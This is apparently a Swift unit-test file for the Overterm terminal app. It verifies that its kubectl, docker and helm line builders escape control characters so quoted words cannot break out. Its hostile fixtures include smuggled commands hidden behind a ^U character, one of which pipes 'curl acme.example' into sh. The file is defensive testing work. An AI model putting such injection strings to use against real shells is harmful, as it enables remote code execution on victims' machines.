import Foundation
import XCTest

@testable import Overterm

/// A line Overterm types into a tab never carries a raw control character
/// (`ShellWord`): ^U there erases the opening quote — in the tty and in
/// zle — and what follows runs in the open. Every line builder is fed one,
/// and zsh reads each quoted word back as it was.
final class ShellWordTests: XCTestCase {
    private static let hostile = [
        "c\u{15}touch /tmp/overterm-pwn; echo ", "\u{3}", "a\nb", "\u{1b}[31mred", "x\u{7f}y", "\u{202e}gpj.sh", "q'uote\\\u{15}",
        "x\u{15}curl acme.example|sh; echo ",
    ]

    private static func raw(_ line: String) -> Bool { line.unicodeScalars.contains(where: ShellWord.isControl) }

    func testEveryQuoterSaysAControlCharacterAsAnEscape() {
        for word in Self.hostile {
            for (name, quoted) in [
                ("KubectlLine", KubectlLine.quoted(word)), ("DockerCommands", DockerCommands.quote(word)),
                ("shellQuoted", TerminalWindowController.shellQuoted(word)), ("KubeProxyProblem", KubeProxyProblem.shellQuoted(word)),
            ] {
                XCTAssertFalse(Self.raw(quoted), "\(name) left a control character raw in \(quoted.debugDescription)")
                XCTAssertTrue(quoted.hasPrefix("$'"), "\(name): \(quoted)")
            }
        }
        // A plain word is as it was.
        XCTAssertEqual(KubectlLine.quoted("web-1"), "web-1")
        XCTAssertEqual(KubectlLine.quoted("it's"), "'it'\\''s'")
    }

    /// zsh, reading no startup file, gives back exactly the word.
    func testZshReadsTheWordBack() throws {
        let zsh = URL(fileURLWithPath: "/bin/zsh")
        guard FileManager.default.isExecutableFile(atPath: zsh.path) else { throw XCTSkip("no zsh") }
        for word in Self.hostile + ["\u{1F600}\u{200B}"] {
            let process = Process()
            process.executableURL = zsh
            process.arguments = ["-f", "-c", "print -rn -- " + KubectlLine.quoted(word)]
            process.environment = ["LANG": "en_US.UTF-8", "LC_ALL": "en_US.UTF-8", "PATH": "/usr/bin:/bin"]
            let out = Pipe()
            process.standardOutput = out
            try process.run()
            let data = out.fileHandleForReading.readDataToEndOfFile()
            process.waitUntilExit()
            XCTAssertEqual(String(decoding: data, as: UTF8.self), word)
        }
    }

    func testEveryLineBuilderTypesNoControlCharacter() throws {
        let word = Self.hostile[0]
        for verb in [KubeProcessVerb.shell, .attach, .followLogs] {
            let line = try XCTUnwrap(KubeCommands.line(verb, context: word, namespace: word, pod: word, container: word))
            XCTAssertFalse(Self.raw(line), line)
        }
        let upgrade = KubeHelmUpgradeWrite(
            release: "web", namespace: "shop", storage: .secret, chart: "/repo/" + word, chartSaid: nil, from: 3, summary: nil, reviewNote: nil)
        XCTAssertNotNil(upgrade.refused, "a chart folder with a control character is refused")
        XCTAssertFalse(Self.raw(upgrade.line(context: "kind-fake")))
        // Run Locally: a pod's env value, image and command written by someone else.
        var run = DockerRunSpec(image: "acme/api:" + word)
        run.env = ["MODE=" + word]
        run.command = DockerCommands.quote(word)
        run.entrypoint = word
        XCTAssertFalse(Self.raw(run.line()))
        run.asked = [DockerRunSpec.Ask(key: "TOKEN", from: "Secret " + word, secret: true)]
        XCTAssertFalse(Self.raw(run.line()))
    }
}
